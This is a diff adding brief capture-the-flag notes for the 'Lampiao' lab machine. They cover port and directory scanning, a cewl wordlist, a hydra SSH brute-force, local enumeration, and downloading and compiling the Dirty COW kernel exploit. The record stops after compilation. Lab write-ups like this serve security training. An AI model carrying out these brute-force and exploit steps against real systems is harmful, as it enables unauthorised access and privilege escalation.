@@ -1,0 +1,31 @@
+192.168.244.48 (Lampiao Writeup)
+
+sudo nmap -Pn -A -p- -T4 192.168.245.48
+visit http://192.168.x.x
+dirb http://192.168.x.x
+finding nothing 
+
+visit http://192.168.x.x:1898
+Find 2 users tiago and Eder
+
+create user.txt and add both username
+Make a dictionary 
+cewl -w passwords.txt http://192.168.245.48:1898/
+hydra -L user.txt -P password.txt 192.168.244.48 ssh -t 4
+get password for tiago user
+login ssh
+ssh tiago@192.168.244.48 
+sudo -l (no luck)
+SUID (noluck)
+check history no luck
+ open /etc/passwd (no luck)
+ 
+ Download for finding exploit
+ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+ 
+chmod +x les.sh
+./les.sh 
+
+Dirtycow is interesting vulnerability
+wget https://www.exploit-db.com/download/40847
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
